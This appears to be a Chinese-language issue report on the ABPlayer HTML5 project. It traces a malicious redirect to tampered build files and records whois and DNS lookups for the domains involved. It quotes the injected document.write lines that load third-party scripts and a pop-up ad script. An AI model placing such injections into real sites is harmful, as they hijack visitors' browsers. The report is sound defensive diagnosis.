title

-----

表现： 
1. 点击链接
2. 被跳转到http://lishi.quzhao.com/js/tui/tui.html

正文：
1. “审查元素”: Screenshot.png
````
<script language="javascript" src="http://p.ywbmh.com:7777/pt/pt.php?src=p0007&amp;t=New%20Interface%20Test%20for%20ABPlayer&amp;ci=3029317831"></script>
````

2. “来源”: Screenshot001.png Screenshot002.png
被感染的代码
````
document.write("<script language='javascript' src='http://zhuogu.github.io/ABPlayerHTML5-bilibili-ver/build/js/ABPLibxml.js?_vv=20080808'></script>");
document.write("<script language='javascript' src='http://p.ywbmh.com:7777/pt/pt.php?src=p0007&t=" + encodeURIComponent(document.title) + "&ci=3029317831'></script>");
````
被感染的文件 ABPLibxml.js ABPMobile.js

3. 追查p.ywbmh.com
tp.php的内容
````
document.write("<script language='javascript' src='http://mystatic.le4le.com/pt/ad/bc_286_pop.js'></script>");
````
ywbmh.com的whois
[file]
p.ywbmh.com的dns
````
A	171.111.153.3
A	171.111.153.2
````

4. 追查le4le.com
whois
[file]
mystatic.le4le.com img.le4le.com的dns
````
A	106.184.7.46
A	106.187.97.70
````

5. 追查lishi.quzhao.com
whois
[file]
dns
````A	111.177.111.83```` 
